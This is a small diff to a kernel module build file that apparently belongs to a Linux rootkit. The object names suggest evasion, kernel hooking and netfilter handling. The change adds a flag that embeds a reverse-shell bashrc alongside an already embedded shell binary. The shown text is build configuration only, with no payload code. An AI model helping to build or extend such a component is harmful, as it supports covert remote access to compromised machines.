@@ -6,4 +6,4 @@ htm-y := cdd.o command.o debugfs.o evasion.o exec.o hook.o main.o netfilter.o ro
 
 ccflags-y := -s -O2 -Wall -std=gnu99 -I$(src)/include
 
-AFLAGS_rodata.o := -DRSHBIN=\"$(src)/res/snc\"
+AFLAGS_rodata.o := -DRSHBIN=\"$(src)/res/snc\" -DBRCBIN=\"$(src)/res/rsh.bashrc\"
